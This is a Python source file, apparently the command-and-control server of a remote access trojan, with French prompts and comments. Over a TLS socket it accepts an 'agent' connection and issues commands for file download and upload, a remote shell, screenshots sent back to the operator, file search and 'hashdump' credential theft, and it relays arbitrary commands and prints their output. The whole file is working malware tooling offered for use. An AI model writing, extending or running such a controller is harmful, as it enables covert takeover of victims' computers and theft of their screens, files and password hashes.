import socket
import ssl
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

def menu_help(client_socket) :
    client_socket.send(b'menu_help')

def download(client_socket) :
    client_socket.send(b'download')

def upload(client_socket) :
    client_socket.send(b'upload')

def shell(client_socket) :
    client_socket.send(b'shell')

def ipconfig(client_socket) :
    client_socket.send(b'ipconfig')

def screenshot(client_socket, nb_screenshot) :
    client_socket.send(b'screenshot')
    screenshot_name = f'screenshot{nb_screenshot}.png'
    with open(screenshot_name, 'wb') as screenshot:
        while True:
            screenshot_received = client_socket.recv(4096)
            if screenshot_received.endswith(b'END'):
                screenshot.write(screenshot_received[:-3])
                break
            screenshot.write(screenshot_received)
    print(f'[+] {screenshot_name} reçu')
    return nb_screenshot + 1

def search(client_socket) :
    client_socket.send(b'search')

def hashdump(client_socket) :
    client_socket.send(b'hashdump')



def main() :

    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    nb_screenshot = 1

    cert = './cert.pem'
    key = './key.pem'

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert, keyfile=key)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_server, SERVER_PORT))
    server_socket.listen(1)

    print(f"[*] Listening on {SERVER_PORT}...")

    # Envelopper le socket avec SSL
    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
        client_socket, client_address = ssl_socket.accept()
        print("[+] Agent received !")

        while True:
            command = input("rat > Taper votre commande ici : ")
            if command.lower() == 'help':
                menu_help(client_socket)
            elif command.lower() == 'download':
                download(client_socket)
            elif command.lower() == 'upload':
                upload(client_socket)
            elif command.lower() == 'shell':
                shell(client_socket)
            elif command.lower() == 'ipconfig':
                ipconfig(client_socket)
            elif command.lower() == 'screenshot':
                nb_screenshot = screenshot(client_socket, nb_screenshot)
            elif command.lower() == 'search':
                search(client_socket)
            elif command.lower() == 'hashdump':
                hashdump(client_socket)
            elif command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            else:
                client_socket.send(command.encode())
                result = client_socket.recv(1024).decode()
                print(result)
        client_socket.close()
    server_socket.close()


if __name__ == "__main__":
    main()